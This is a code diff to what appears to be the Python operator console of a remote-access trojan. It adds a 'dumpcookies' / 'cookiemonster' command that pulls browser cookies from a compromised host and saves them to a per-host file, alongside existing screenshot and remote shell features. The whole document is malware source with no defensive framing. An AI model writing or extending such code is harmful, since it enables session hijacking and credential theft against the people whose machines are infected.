@@ -15,6 +15,7 @@ import zlib
 import base64
 import hashlib
 from PIL import Image
+import json
 import argparse
 
 import __builtin__ 
@@ -350,7 +351,12 @@ class Client:
 		
 		return
 
-		
+	def save_cookies(self):
+		cookies = json.loads(self.recv().split(chr(253))[0])
+		with open("cookies_"+self.hostname, "w") as f:
+			for website in cookies.keys():
+				f.write("Website: "+website)
+				pass
 
 	def interact(self):
 		self.interacting = True
@@ -399,6 +405,11 @@ class Client:
 			elif user_input == "screenshot":
 				self.send(user_input)
 				self.display_snap(screenie=True)
+				user_input = "cd ."
+				
+			elif user_input in ["dumpcookies","cookiemonster","OM NOM NOM"]:
+				self.send(user_input)
+				self.save_cookies()
 				user_input = "cd ."
 
 			self.send(user_input)
@@ -473,7 +484,7 @@ class Handler:
 				self.current_id += 1
 				
 				data = cli.recv(4096)
-				logging.debug(data)
+				logging.debug("Received data: "+data.strip())
 				if data.startswith("GET"): continue
 				
 				aes = self.dh_exchange(cli)
